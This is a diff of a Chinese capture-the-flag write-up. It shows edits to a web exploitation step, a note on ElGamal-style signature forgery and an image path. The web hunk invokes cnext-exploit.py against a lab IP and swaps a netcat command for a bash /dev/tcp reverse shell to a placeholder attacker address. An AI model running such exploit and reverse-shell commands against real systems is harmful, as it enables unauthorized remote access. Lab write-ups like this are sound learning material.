@@ -654,10 +654,10 @@ Exploit()
 然后执行命令
 
 ```bash
-python3 cnext-exploit.py http://192.168.18.24/ "nc -vv <IP> <PORT>"
+python3 cnext-exploit.py http://192.168.18.24/ "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"
 ```
 
-不知道是不是reverse shell命令写错了，shell没弹回来，而且最后半小时做的所以来不及了。。
+不知道是不是不出网shell没弹回来，而且最后半小时做的所以来不及了。。
 
 ## Crypto
 
@@ -773,7 +773,7 @@ print(long_to_bytes(m))
 ### Alice'sSecret
 [附件](attachments/cry.py)
 
-伪造和消息`Bob`一样的前面，验证过程为
+伪造和消息`Bob`一样的签名，验证过程为
 
 $$
 g^m \equiv y^r r^s \mod (p - 1)
@@ -825,7 +825,7 @@ with open('result.png', 'wb') as f:
 p.interactive()
 ```
 
-![](attachment/result.png)
+![](attachments/result.png)
 
 ### rickroll
 [附件](attachments/rickroll.zip)
